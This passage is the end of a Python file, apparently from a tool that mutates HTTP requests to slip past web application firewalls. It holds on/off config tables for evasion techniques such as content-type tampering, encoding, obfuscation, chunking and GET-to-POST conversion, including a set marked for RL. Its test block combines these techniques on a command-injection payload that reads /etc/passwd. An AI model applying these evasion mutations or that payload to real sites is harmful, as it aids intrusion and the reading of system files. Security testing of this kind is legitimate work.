    "mutant_methods_line_breaks": (mutant_methods_line_breaks, False),
    "mutant_methods_add_padding": (mutant_methods_add_padding, True),
    "mutant_methods_multipart_boundary": (mutant_methods_multipart_boundary, True),
    "mutant_upload_methods_double_equals": (mutant_upload_methods_double_equals, True),
    "mutant_methods_delete_content_type_of_data": (mutant_methods_delete_content_type_of_data, True),
    "mutant_methods_modify_content_type_case": (mutant_methods_modify_content_type_case, True),
    "mutant_methods_modify_case_of_content_type": (mutant_methods_modify_case_of_content_type, True),
    "mutant_methods_add_Content_Type_for_get_request": (mutant_methods_add_Content_Type_for_get_request, True),
    "mutant_methods_add_harmless_command_for_get_request": (mutant_methods_add_harmless_command_for_get_request, True),
    "mutant_methods_chunked_transfer_encoding": (mutant_methods_chunked_transfer_encoding, False),
    "mutant_methods_multipart_form_data": (mutant_methods_multipart_form_data, True),
    "mutant_methods_sql_comment_obfuscation": (mutant_methods_sql_comment_obfuscation, False),
    "mutant_methods_convert_get_to_post": (mutant_methods_convert_get_to_post, False),
    # "mutant_methods_peremeter_pollution_case1": (mutant_methods_peremeter_pollution_case1, True),
    # "mutant_methods_peremeter_pollution_case2": (mutant_methods_peremeter_pollution_case2, True),
    # "mutant_methods_fake_IP": (mutant_methods_fake_IP, True),
    # "mutant_methods_change_charset": (mutant_methods_change_charset, True),
    # "mutant_methods_add_accept_charset": (mutant_methods_add_accept_charset, True),
    # "mutant_methods_change_extensions": (mutant_methods_change_extensions, True),
}
# 为变异方法添加开关
mutant_methods_config_for_rl = {
    "mutant_methods_modify_content_type": (mutant_methods_modify_content_type, True),
    "mutant_methods_fake_content_type": (mutant_methods_fake_content_type, True),
    "mutant_methods_case_and_comment_obfuscation": (mutant_methods_case_and_comment_obfuscation, False),
    "mutant_methods_url_encoding": (mutant_methods_url_encoding, True),
    "mutant_methods_unicode_normalization": (mutant_methods_unicode_normalization, False),
    "mutant_methods_line_breaks": (mutant_methods_line_breaks, False),
    "mutant_methods_add_padding": (mutant_methods_add_padding, True),
    "mutant_methods_multipart_boundary": (mutant_methods_multipart_boundary, True), # disabled for RL
    "mutant_upload_methods_double_equals": (mutant_upload_methods_double_equals, True),
    "mutant_methods_delete_content_type_of_data": (mutant_methods_delete_content_type_of_data, True),
    "mutant_methods_modify_content_type_case": (mutant_methods_modify_content_type_case, True),
    "mutant_methods_modify_case_of_content_type": (mutant_methods_modify_case_of_content_type, True),
    "mutant_methods_add_Content_Type_for_get_request": (mutant_methods_add_Content_Type_for_get_request, True),
    "mutant_methods_add_harmless_command_for_get_request": (mutant_methods_add_harmless_command_for_get_request, True),
    "mutant_methods_chunked_transfer_encoding": (mutant_methods_chunked_transfer_encoding, False),
    "mutant_methods_multipart_form_data": (mutant_methods_multipart_form_data, True), # disabled for RL
    "mutant_methods_sql_comment_obfuscation": (mutant_methods_sql_comment_obfuscation, False),
    "mutant_methods_convert_get_to_post": (mutant_methods_convert_get_to_post, False),
}

deep_mutant_methods_config = {
    "mutant_methods_modify_content_type": (mutant_methods_modify_content_type, False),
    "mutant_methods_fake_content_type": (mutant_methods_fake_content_type,  False),
    "mutant_methods_case_and_comment_obfuscation": (mutant_methods_case_and_comment_obfuscation, False),
    "mutant_methods_url_encoding": (mutant_methods_url_encoding,  False),
    "mutant_methods_unicode_normalization": (mutant_methods_unicode_normalization, False),
    "mutant_methods_line_breaks": (mutant_methods_line_breaks, False),
    "mutant_methods_add_padding": (mutant_methods_add_padding,  False),
    "mutant_methods_multipart_boundary": (mutant_methods_multipart_boundary,  False),
    "mutant_upload_methods_double_equals": (mutant_upload_methods_double_equals,  False),
    "mutant_methods_delete_content_type_of_data": (mutant_methods_delete_content_type_of_data,  False),
    "mutant_methods_modify_content_type_case": (mutant_methods_modify_content_type_case,  False),
    "mutant_methods_modify_case_of_content_type": (mutant_methods_modify_case_of_content_type,  False),
    "mutant_methods_add_Content_Type_for_get_request": (mutant_methods_add_Content_Type_for_get_request,  False),
    "mutant_methods_add_harmless_command_for_get_request": (mutant_methods_add_harmless_command_for_get_request,  False),
    "mutant_methods_chunked_transfer_encoding": (mutant_methods_chunked_transfer_encoding, False),
    "mutant_methods_multipart_form_data": (mutant_methods_multipart_form_data,  False),
    "mutant_methods_sql_comment_obfuscation": (mutant_methods_sql_comment_obfuscation,  False),
    "mutant_methods_convert_get_to_post": (mutant_methods_convert_get_to_post, True),
}
# 生成两两组合的变异方法
def generate_combinations(mutant_methods):
    """ 生成两两组合的变异方法 """
    return list(itertools.combinations(mutant_methods, 2))




# 初始化启用的变异方法
mutant_methods = [
    method for method, enabled in mutant_methods_config.values()
    if enabled
]


disabled_mutant_methods = [
    method for method, enabled in mutant_methods_config.values()
    if not enabled
]
# convert GET to POST
deep_mutant_methods = [
    method for method, enabled in deep_mutant_methods_config.values()
    if enabled
]
    

if __name__ == '__main__':
    # 测试变异方法
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    url = 'http://example.com/get?cmd=cat%20/etc/passwd'
    method = 'GET'
    data = 'cmd=cat /etc/passwd'
    files = None
    # 测试两两组合的变异方法
    combinations = generate_combinations(mutant_methods)
    mutant_payloads = []
    for method1, method2 in combinations:
        mutant_payloads_generated_by_method_1 = method1(headers, url, method, data, files) 
        for mutant_payload in mutant_payloads_generated_by_method_1:
            sub_mutant_payloads_generated_by_method_2 = method2(mutant_payload['headers'], mutant_payload['url'], mutant_payload['method'], mutant_payload['data'], mutant_payload['files'])
            mutant_payloads.extend(sub_mutant_payloads_generated_by_method_2)
        print(json.dumps(mutant_payloads, indent=4))
